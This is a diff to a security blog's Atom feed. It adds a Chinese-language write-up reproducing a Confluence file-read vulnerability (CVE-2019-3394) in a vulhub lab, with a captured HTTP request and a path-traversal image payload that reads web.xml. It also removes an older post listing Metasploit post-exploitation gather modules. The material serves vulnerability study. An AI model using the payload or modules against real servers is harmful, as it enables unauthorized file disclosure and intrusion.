@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-03-23T04:49:58.665Z</updated>
+  <updated>2020-03-24T03:24:26.077Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Confluence文件读取漏洞复现(CVE-2019-3394)</title>
+    <link href="http://sherlocz.github.io/2020/03/24/Confluence%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-3394/"/>
+    <id>http://sherlocz.github.io/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/</id>
+    <published>2020-03-24T02:30:01.000Z</published>
+    <updated>2020-03-24T03:24:26.077Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>6.1.0 &lt;= version &lt; 6.6.16<br>6.7.0 &lt;= version &lt; 6.13.7<br>6.14.0 &lt;= version &lt; 6.15.8</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用P师傅的vulhub直接上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line"># Download the latest version of the vulhub </span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"># Entry vulnerability directory </span><br><span class="line">cd /confluence/CVE-2019-3396/</span><br><span class="line"># Compile (optional) </span><br><span class="line">docker-compose build </span><br><span class="line"># Run </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>安装完成之后本地会开启8090端口，我们根据导向进行安装<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/1.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/2.png" alt><br>这里我们需要去官网获取一个licence，注意这里的Server ID，成功获取之后在Setup页面点击下一步，等他转圈圈就行了<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/3.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/4.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/5.png" alt><br>然后稀里糊涂就安装成功了。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>创建页面的时候抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /rest/api/content/65603?status=draft HTTP/1.1</span><br><span class="line">Host: 192.168.75.138:8090</span><br><span class="line">Content-Length: 373</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.75.138:8090</span><br><span class="line">Referer: http://192.168.75.138:8090/pages/resumedraft.action?draftId=65603&amp;draftShareId=e3bf8f62-5cdc-4586-ae67-0098ed31f5a5</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=EB2B904418498E2A22446B8A4D44664A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;current&quot;,&quot;title&quot;:&quot;123123&quot;,&quot;space&quot;:&#123;&quot;key&quot;:&quot;SHER&quot;&#125;,&quot;body&quot;:&#123;&quot;editor&quot;:&#123;&quot;value&quot;:&lt;p&gt;1231231&lt;/p&gt;</span><br><span class="line">&quot;,&quot;representation&quot;:&quot;editor&quot;,&quot;content&quot;:&#123;&quot;id&quot;:&quot;65603&quot;&#125;&#125;&#125;,&quot;id&quot;:&quot;65603&quot;,&quot;type&quot;:&quot;page&quot;,&quot;version&quot;:&#123;&quot;number&quot;:1,&quot;minorEdit&quot;:true,&quot;syncRev&quot;:&quot;0.2ROrHE4DizkcCc1u6UtkBrc.10&quot;&#125;,&quot;ancestors&quot;:[&#123;&quot;id&quot;:&quot;65584&quot;,&quot;type&quot;:&quot;page&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure></p><p>将其中的value值修改成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;img class=\&quot;confluence-embedded-image\&quot; src=\&quot;/packages/../web.xml\&quot; /&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>然后再导出word的时候抓包</p><p><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/6.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/7.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/jas502n/CVE-2019-3394" title="https://github.com/jas502n/CVE-2019-3394" target="_blank" rel="noopener">CVE-2019-3394</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h1&gt;&lt;p&gt;6.1.0 &amp;lt;= version &amp;lt; 6.6.16&lt;br&gt;6.7.0 &amp;lt;= version &amp;lt; 6.
+      
+    
+    </summary>
+    
+    
+    
+      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>利用spf伪造邮箱发送</title>
@@ -482,35 +506,6 @@
     
     
       <category term="甲方安全" scheme="http://sherlocz.github.io/tags/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用Msf进行后渗透中的信息收集</title>
-    <link href="http://sherlocz.github.io/2019/12/03/%E5%88%A9%E7%94%A8Msf%E8%BF%9B%E8%A1%8C%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
-    <id>http://sherlocz.github.io/2019/12/03/利用Msf进行后渗透中的信息收集/</id>
-    <published>2019-12-03T08:54:19.000Z</published>
-    <updated>2020-01-13T05:03:00.304Z</updated>
-    
-    <content type="html"><![CDATA[<p>post/windows/gather/forensics/enum_drives</p><p>post/windows/gather/forensics/browser_history</p><p>post/windows/gather/checkvm</p><p>post/windows/gather/enum_services</p><p>post/windows/gather/enum_applications</p><p>post/windows/gather/enum_shares</p><p>post/windows/gather/dumplinks</p><p>post/windows/gather/enum_applications</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;post/windows/gather/forensics/enum_drives&lt;/p&gt;
-&lt;p&gt;post/windows/gather/forensics/browser_history&lt;/p&gt;
-&lt;p&gt;post/windows/gather/checkvm&lt;/p&gt;
-&lt;p&gt;
-      
-    
-    </summary>
-    
-    
-    
-      <category term="后渗透" scheme="http://sherlocz.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="msf" scheme="http://sherlocz.github.io/tags/msf/"/>
     
   </entry>
   
